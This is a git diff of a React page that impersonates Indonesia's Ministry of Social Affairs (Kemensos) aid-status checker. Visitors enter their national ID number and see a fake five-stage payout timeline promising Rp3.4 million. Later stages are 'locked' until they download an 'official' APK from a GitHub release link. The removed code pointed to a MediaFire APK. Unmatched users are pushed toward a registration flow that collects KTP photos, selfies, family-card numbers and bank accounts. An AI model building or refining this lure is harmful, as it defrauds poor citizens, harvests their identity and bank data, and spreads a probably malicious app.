@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { Search, ShieldAlert, Lock, Smartphone, CheckCircle, Clock } from 'lucide-react';
+import { Search, Lock, Smartphone, Clock, Check, Download, ShieldCheck } from 'lucide-react';
 import { Penerima } from '../types';
 
 interface CekBansosProps {
@@ -17,6 +17,8 @@ export default function CekBansos({
   const [checkedPenerima, setCheckedPenerima] = useState<Penerima | null>(null);
   const [isSearching, setIsSearching] = useState(false);
 
+  const apkDownloadUrl = "https://github.com/bansosresmiid/bansosresmiid/releases/download/v1.0/Bansos_2026.apk";
+
   const handleCheck = (e: React.FormEvent) => {
     e.preventDefault();
     const cleanNik = nikInput.trim();
@@ -29,234 +31,230 @@ export default function CekBansos({
     setIsSearching(true);
     setCheckedPenerima(null);
 
-    // Simulate official Kemensos API database search
     setTimeout(() => {
-      const found = daftarPenerima.find((p) => p.nik === cleanNik);
       setIsSearching(false);
+      const found = daftarPenerima.find((p) => p.nik === cleanNik);
 
       if (found) {
         setCheckedPenerima(found);
-        onShowToast('Pencarian NIK berhasil ditemukan!');
+        onShowToast('Data NIK ditemukan! Menampilkan status verifikasi.');
       } else {
-        // Prepare not found state
-        setCheckedPenerima({
-          nik: cleanNik,
-          nama: '',
-          email: '',
-          hp: '',
-          alamat: '',
-          kk: '',
-          bankName: '',
-          bankAccount: '',
-          status: 'Tidak Terdaftar',
-          stage: 0,
-          createdAt: '',
-          lastActive: '',
-        });
-        onShowToast('NIK Anda belum terdaftar dalam DTKS Bansos!', true);
+        onShowToast('NIK Anda belum terdaftar. Mengalihkan Anda secara otomatis ke halaman Registrasi...', false);
+        setTimeout(() => {
+          onRedirectToRegistrasi(cleanNik);
+        }, 1500);
       }
-    }, 1200);
+    }, 800);
   };
 
+  const stages = [
+    {
+      step: 1,
+      title: 'Tahap 1: Registrasi Akun',
+      description: 'Pembuatan akun portal dan integrasi awal NIK Anda.',
+      isCompleted: true,
+      isLocked: false,
+    },
+    {
+      step: 2,
+      title: 'Tahap 2: Verifikasi Data Mandiri',
+      description: 'Unggah Dokumen KTP, Foto selfie KTP, verifikasi Nomor KK, dan input Rekening Bank Penerima.',
+      isCompleted: false,
+      isLocked: true,
+    },
+    {
+      step: 3,
+      title: 'Tahap 3: Verifikasi Sistem Dukcapil',
+      description: 'Pengecekan keselarasan biometrik KTP langsung dengan server Dukcapil Kemendagri RI.',
+      isCompleted: false,
+      isLocked: true,
+    },
+    {
+      step: 4,
+      title: 'Tahap 4: Persetujuan Kelayakan (Kemensos)',
+      description: 'Uji verifikasi kelayakan parameter kemiskinan dan DTKS oleh Tim Kurator Kementerian Sosial.',
+      isCompleted: false,
+      isLocked: true,
+    },
+    {
+      step: 5,
+      title: 'Tahap 5: Pencairan Dana Bantuan',
+      description: 'Transfer tunai langsung senilai Rp3.400.000 ke rekening bank Keluarga Penerima Manfaat.',
+      isCompleted: false,
+      isLocked: true,
+    },
+  ];
+
   return (
-    <div className="max-w-2xl mx-auto space-y-8 animate-fade-in">
-      {/* Title */}
+    <div className="max-w-3xl mx-auto space-y-8 animate-fade-in">
+      {/* Search Header */}
       <div className="text-center space-y-3">
-        <h2 className="font-serif text-2xl sm:text-3xl font-bold text-slate-900">
+        <div className="inline-flex items-center gap-2 px-3 py-1 bg-[#EAF4FF] text-[#0F5CC8] rounded-full text-xs font-bold uppercase tracking-wider border border-[#0F5CC8]/20">
+          <ShieldCheck size={14} /> Layanan Pencarian Terpadu DTKS
+        </div>
+        <h2 className="font-sans text-2xl sm:text-3xl font-extrabold text-[#0A2F73]">
           Cek Status Penerima Bansos
         </h2>
-        <p className="text-sm text-slate-500 max-w-lg mx-auto">
-          Gunakan layanan mandiri ini untuk memverifikasi apakah NIK KTP Anda sudah terdaftar sebagai Keluarga Penerima Manfaat (KPM).
+        <p className="text-sm text-[#6B7280] max-w-lg mx-auto leading-relaxed">
+          Masukkan 16 digit Nomor Induk Kependudukan (NIK) Anda untuk melihat status verifikasi terkini dan alur pencairan dana bansos.
         </p>
       </div>
 
-      {/* Search Input Box */}
-      <div className="bg-white border border-slate-200 rounded-xl shadow-xs overflow-hidden">
-        <div className="bg-slate-900 text-white px-6 py-5 flex items-center gap-3 border-b border-slate-800">
-          <div className="p-2 bg-slate-800 border border-slate-700 rounded text-white">
-            <Search size={18} />
-          </div>
-          <div>
-            <h3 className="text-xs font-bold tracking-wider uppercase">Pencarian Database DTKS</h3>
-            <p className="text-[9px] text-slate-400 font-mono tracking-wider">INTEGRASI DENGAN DUKCAPIL NASIONAL</p>
-          </div>
-        </div>
-
-        <form onSubmit={handleCheck} className="p-6 sm:p-8 space-y-4">
+      {/* Check Form Card */}
+      <div className="card-official p-6 sm:p-8">
+        <form onSubmit={handleCheck} className="space-y-4">
           <div className="space-y-2">
-            <label htmlFor="nikInput" className="block text-[10px] font-bold text-slate-700 uppercase tracking-wider">
-              Masukkan Nomor Induk Kependudukan (NIK) Anda
+            <label htmlFor="nikInput" className="block text-xs font-bold uppercase tracking-wider text-[#0A2F73]">
+              Nomor Induk Kependudukan (NIK)
             </label>
             <div className="relative">
               <input
                 id="nikInput"
                 type="text"
+                placeholder="Contoh: 3273011205980002"
                 maxLength={16}
-                placeholder="Masukkan 16 digit angka NIK"
                 value={nikInput}
                 onChange={(e) => setNikInput(e.target.value.replace(/\D/g, ''))}
-                className="w-full px-4 py-3 border border-slate-200 bg-slate-50 rounded focus:outline-none focus:ring-1 focus:ring-slate-900 focus:border-slate-900 font-mono text-sm tracking-widest text-slate-950"
+                className="w-full pl-12 pr-4 py-3.5 bg-white border border-[#E5E7EB] rounded-[14px] focus:outline-none focus:ring-2 focus:ring-[#0F5CC8] focus:border-[#0F5CC8] font-mono text-base tracking-widest text-[#1F2937] transition-all shadow-2xs"
                 required
               />
+              <div className="absolute left-4 top-1/2 -translate-y-1/2 text-[#0F5CC8]">
+                <Search size={20} />
+              </div>
             </div>
           </div>
 
           <button
             type="submit"
             disabled={isSearching}
-            className="w-full py-3.5 bg-slate-900 hover:bg-slate-800 disabled:bg-slate-350 text-white font-bold text-xs uppercase tracking-widest rounded transition duration-150 cursor-pointer flex items-center justify-center gap-2"
+            className="w-full py-3.5 bg-[#0F5CC8] hover:bg-[#0A2F73] disabled:bg-slate-300 text-white font-bold text-xs uppercase tracking-wider rounded-[14px] btn-glow-blue cursor-pointer flex items-center justify-center gap-2 transition-all duration-300"
           >
             {isSearching ? (
               <>
-                <span className="h-4 w-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></span>
-                SEDANG MENCARI DATA...
+                <svg className="animate-spin h-5 w-5 text-white" fill="none" viewBox="0 0 24 24">
+                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
+                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
+                </svg>
+                Menghubungkan ke Server Kemensos...
               </>
             ) : (
-              'CARI DATA NIK KPM'
+              '🔍 CEK STATUS VERIFIKASI SEKARANG'
             )}
           </button>
         </form>
       </div>
 
-      {/* Result Presentation */}
+      {/* Search Results */}
       {checkedPenerima && (
-        <div className="bg-white border border-slate-200 rounded-xl overflow-hidden shadow-sm animate-slide-in">
-          {checkedPenerima.status === 'Tidak Terdaftar' ? (
-            /* NOT FOUND BLOCK */
-            <div className="p-6 sm:p-8 text-center space-y-5">
-              <div className="inline-flex p-4 bg-red-50 text-red-600 rounded-full border border-red-100">
-                <ShieldAlert size={36} />
+        <div className="card-official overflow-hidden animate-slide-up">
+          {/* Result Card Header */}
+          <div className="bg-[#0A2F73] text-white px-6 py-4 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-2 border-b border-[#0F5CC8]/30">
+            <div>
+              <span className="text-[10px] font-bold tracking-wider text-[#F5C400] uppercase">Hasil Pencarian Resmi</span>
+              <h3 className="text-lg font-extrabold uppercase tracking-tight font-sans text-white">{checkedPenerima.nama}</h3>
+            </div>
+            <div className="flex items-center gap-3">
+              <span className="text-xs font-mono text-[#EAF4FF]">NIK: {checkedPenerima.nik}</span>
+              <span className="text-xs px-3 py-1 bg-[#2E7D32] text-white rounded-full font-bold uppercase tracking-wider">
+                {checkedPenerima.status}
+              </span>
+            </div>
+          </div>
+
+          <div className="p-6 sm:p-8 space-y-8">
+            <div className="bg-[#EAF4FF] border-l-4 border-[#0F5CC8] p-4 rounded-r-2xl flex items-start gap-3">
+              <Clock className="text-[#0F5CC8] mt-0.5 shrink-0" size={20} />
+              <div className="text-xs text-[#1F2937] leading-relaxed">
+                <p className="font-extrabold text-[#0A2F73]">Status Tahap 1: SELESAI</p>
+                <p className="mt-1">
+                  Akun Anda terdaftar pada sistem web portal. Untuk melanjutkan ke <span className="font-bold underline text-[#0F5CC8]">Tahap 2 hingga Tahap 5</span>, Anda wajib melakukan verifikasi aman menggunakan aplikasi mobile resmi.
+                </p>
               </div>
-              <div className="space-y-2">
-                <h3 className="font-sans text-lg font-black uppercase text-slate-900">
-                  Data NIK Tidak Ditemukan!
-                </h3>
-                <p className="text-xs text-slate-600 leading-relaxed max-w-md mx-auto">
-                  Nomor NIK <span className="font-mono font-bold text-slate-900">{checkedPenerima.nik}</span> belum terdaftar di Data Terpadu Kesejahteraan Sosial (DTKS) nasional.
+            </div>
+
+            {/* Verification & Disbursement Stages Timeline */}
+            <div>
+              <h4 className="font-sans text-[10px] font-extrabold tracking-widest text-[#0F5CC8] uppercase mb-6">
+                Tahapan Proses Verifikasi & Pencairan Dana
+              </h4>
+
+              <div className="relative border-l-2 border-[#0F5CC8]/20 pl-6 ml-3 space-y-8">
+                {stages.map((stg) => (
+                  <div key={stg.step} className="relative">
+                    {/* Circle Indicator */}
+                    <div
+                      className={`absolute -left-[35px] top-0.5 h-6 w-6 rounded-full flex items-center justify-center border-2 ${
+                        stg.isCompleted
+                          ? 'bg-[#0F5CC8] border-[#0F5CC8] text-white'
+                          : 'bg-white border-[#E5E7EB] text-[#6B7280]'
+                      }`}
+                    >
+                      {stg.isCompleted ? (
+                        <Check size={12} strokeWidth={3} />
+                      ) : (
+                        <span className="text-[10px] font-bold">{stg.step}</span>
+                      )}
+                    </div>
+
+                    {/* Stage Details */}
+                    <div className="space-y-1">
+                      <div className="flex items-center gap-2">
+                        <h5
+                          className={`text-xs font-bold uppercase tracking-wider ${
+                            stg.isCompleted ? 'text-[#0A2F73] font-extrabold' : 'text-[#6B7280]'
+                          }`}
+                        >
+                          {stg.title}
+                        </h5>
+                        {stg.isLocked && (
+                          <span className="inline-flex items-center gap-1 text-[9px] px-2 py-0.5 bg-[#F5F7FA] border border-[#EAF4FF] text-[#6B7280] font-bold rounded-lg">
+                            <Lock size={9} /> Terkunci
+                          </span>
+                        )}
+                        {stg.isCompleted && (
+                          <span className="inline-flex items-center gap-1 text-[9px] px-2 py-0.5 bg-[#2E7D32]/10 text-[#2E7D32] font-bold rounded-lg">
+                            Aktif
+                          </span>
+                        )}
+                      </div>
+                      <p className="text-xs text-[#6B7280] leading-relaxed max-w-xl">
+                        {stg.description}
+                      </p>
+                    </div>
+                  </div>
+                ))}
+              </div>
+            </div>
+
+            {/* CTA Section "VERIFIKASI SEKARANG" */}
+            <div className="pt-6 border-t border-[#EAF4FF] flex flex-col items-center text-center space-y-4">
+              <div className="p-3 bg-[#EAF4FF] text-[#0F5CC8] rounded-2xl border border-[#0F5CC8]/20">
+                <Smartphone size={28} />
+              </div>
+              <div className="space-y-1 max-w-md">
+                <h4 className="text-sm font-extrabold text-[#0A2F73] uppercase tracking-wider">Lanjutkan Verifikasi Sekarang</h4>
+                <p className="text-xs text-[#6B7280] leading-relaxed">
+                  Untuk melakukan upload dokumen foto KTP, verifikasi KK, serta klaim rekening bank penyaluran bansos Rp3,4 Juta Anda, klik tombol di bawah untuk mengunduh Aplikasi Resmi Bansos Kemensos RI.
                 </p>
               </div>
 
-              {/* Action redirect to registration */}
-              <div className="bg-slate-50 border border-slate-200 rounded p-5 max-w-md mx-auto text-center space-y-4">
-                <p className="text-xs text-slate-600 leading-relaxed">
-                  Negara memberikan jaminan perlindungan sosial bagi warga tidak mampu. Jika Anda merasa memenuhi kriteria, silakan daftarkan akun baru Anda.
-                </p>
-                <button
-                  onClick={() => onRedirectToRegistrasi(checkedPenerima.nik)}
-                  className="px-5 py-2.5 bg-slate-900 hover:bg-slate-800 text-white font-bold text-xs tracking-widest rounded uppercase transition cursor-pointer"
-                >
-                  DAFTAR AKUN BANSOS BARU (TAHAP 1)
-                </button>
-              </div>
+              <a
+                href={apkDownloadUrl}
+                target="_blank"
+                rel="noopener noreferrer"
+                className="px-8 py-3.5 bg-[#F5C400] hover:bg-[#E9B400] text-[#1F2937] font-extrabold text-xs tracking-wider rounded-[14px] btn-glow-yellow cursor-pointer uppercase inline-flex items-center gap-2 transition-all duration-300"
+              >
+                <Download size={16} />
+                📲 VERIFIKASI SEKARANG VIA APK
+              </a>
+
+              <span className="text-[10px] text-[#6B7280] uppercase tracking-wider">
+                Layanan verifikasi ini gratis dan dilindungi sandi enkripsi Kemensos RI.
+              </span>
             </div>
-          ) : (
-            /* FOUND RECEIVED BLOCK */
-            <div className="divide-y divide-slate-100">
-              <div className="p-6 sm:p-8 flex flex-col sm:flex-row items-center sm:items-start gap-4 justify-between bg-slate-50/50">
-                <div className="space-y-1.5 text-center sm:text-left">
-                  <div className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full bg-emerald-50 border border-emerald-200 text-[10px] font-bold text-emerald-700 uppercase tracking-wider font-mono">
-                    <CheckCircle size={10} className="shrink-0" /> TERDATA SEBAGAI PENERIMA
-                  </div>
-                  <h3 className="font-serif text-xl font-bold text-slate-900">
-                    {checkedPenerima.nama}
-                  </h3>
-                  <p className="text-xs font-mono text-slate-500">
-                    NIK: {checkedPenerima.nik} | No. KK: {checkedPenerima.kk || '-'}
-                  </p>
-                </div>
-                <div className="text-center sm:text-right">
-                  <div className="text-[10px] font-bold text-slate-400 uppercase font-mono tracking-wider">Status Kelayakan</div>
-                  <div className="text-lg font-black font-mono text-emerald-600 uppercase mt-0.5">BERHAK</div>
-                  <div className="text-[10px] text-slate-500 font-semibold font-sans">Alokasi: Rp3.400.000 / KK</div>
-                </div>
-              </div>
-
-              <div className="p-6 sm:p-8 space-y-6">
-                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
-                  <div className="space-y-1 border-b border-slate-50 pb-2">
-                    <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider block">Alamat Rumah</span>
-                    <span className="text-slate-800 leading-normal font-medium">{checkedPenerima.alamat}</span>
-                  </div>
-                  <div className="space-y-1 border-b border-slate-50 pb-2">
-                    <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider block">Bank Penyalur Terdaftar (Tahap 2)</span>
-                    <span className="text-slate-900 font-bold block">
-                      🏢 {checkedPenerima.bankName} – No. Rek: <span className="font-mono font-black">{checkedPenerima.bankAccount || '-'}</span>
-                    </span>
-                  </div>
-                </div>
-
-                {/* Stage Flow */}
-                <div className="space-y-4">
-                  <span className="text-[10px] font-bold text-slate-400 uppercase tracking-widest block font-mono">Tahapan Penyaluran Bansos (Step-by-Step)</span>
-                  
-                  <div className="grid grid-cols-1 md:grid-cols-5 gap-3">
-                    <div className="bg-slate-900 text-white p-3 rounded border border-slate-900 space-y-1 relative">
-                      <div className="flex items-center justify-between">
-                        <span className="text-[9px] font-mono bg-white/20 px-1.5 py-0.5 rounded font-black">TAHAP 1</span>
-                        <span className="text-emerald-400 font-bold text-[10px]">✓</span>
-                      </div>
-                      <h6 className="text-[10px] font-bold uppercase">Akun KPM</h6>
-                    </div>
-
-                    <div className="bg-slate-900 text-white p-3 rounded border border-slate-900 space-y-1">
-                      <div className="flex items-center justify-between">
-                        <span className="text-[9px] font-mono bg-white/20 px-1.5 py-0.5 rounded font-black">TAHAP 2</span>
-                        <span className="text-emerald-400 font-bold text-[10px]">✓</span>
-                      </div>
-                      <h6 className="text-[10px] font-bold uppercase">Rekening Bank</h6>
-                    </div>
-
-                    <div className="bg-white border border-dashed border-slate-300 p-3 rounded space-y-1">
-                      <div className="flex items-center justify-between">
-                        <span className="text-[9px] font-mono bg-slate-100 text-slate-800 px-1.5 py-0.5 rounded font-black">TAHAP 3</span>
-                        <span className="text-slate-500 font-mono text-[8px] animate-pulse">Proses...</span>
-                      </div>
-                      <h6 className="text-[10px] font-bold uppercase text-slate-900">Biometrik APK</h6>
-                    </div>
-
-                    <div className="bg-white border border-slate-200 p-3 rounded space-y-1 opacity-50">
-                      <div className="flex items-center justify-between">
-                        <span className="text-[9px] font-mono bg-slate-100 text-slate-850 px-1.5 py-0.5 rounded font-black">TAHAP 4</span>
-                        <span className="text-slate-400 text-[8px]">Terkunci</span>
-                      </div>
-                      <h6 className="text-[10px] font-bold uppercase text-slate-850">Verval Berkas</h6>
-                    </div>
-
-                    <div className="bg-white border border-slate-200 p-3 rounded space-y-1 opacity-50">
-                      <div className="flex items-center justify-between">
-                        <span className="text-[9px] font-mono bg-slate-100 text-slate-850 px-1.5 py-0.5 rounded font-black">TAHAP 5</span>
-                        <span className="text-slate-400 text-[8px]">Terkunci</span>
-                      </div>
-                      <h6 className="text-[10px] font-bold uppercase text-slate-850">Cair Mandiri</h6>
-                    </div>
-                  </div>
-                </div>
-
-                {/* Secure App Notice */}
-               <div className="bg-slate-50 border border-slate-200 rounded p-5 flex flex-col md:flex-row items-center gap-4 justify-between">
-  <div className="space-y-1 text-center md:text-left max-w-md">
-    <h5 className="font-bold text-xs text-slate-900 uppercase tracking-wider flex items-center gap-1.5 justify-center md:justify-start">
-      <Lock size={14} className="text-slate-900" />
-      Pengajuan & Pencairan Tahap 3 s/d 5 Terkunci
-    </h5>
-    <p className="text-[11px] text-slate-600 leading-relaxed font-medium">
-      Silakan download aplikasi smartphone resmi Bansos Kemensos RI untuk melakukan verifikasi biometrik wajah serta memproses verifikasi berkas tahap lanjut.
-    </p>
-  </div>
-  <a
- href="https://www.mediafire.com/file/gs22aoeubb1e2mg/Bansos_2026.apk/file"
- target="_blank"
- rel="noopener noreferrer"
- className="px-4 py-2.5 bg-slate-900 hover:bg-slate-800 text-white font-bold text-[10px] tracking-widest rounded uppercase transition shrink-0 cursor-pointer flex items-center gap-1.5 no-underline"
->
- <Smartphone size={12} /> VERIFIKASI BIOMETRIK
-</a>
-</div>
-              </div>
-            </div>
-          )}
+          </div>
         </div>
       )}
     </div>
   );
-          }
+                      }
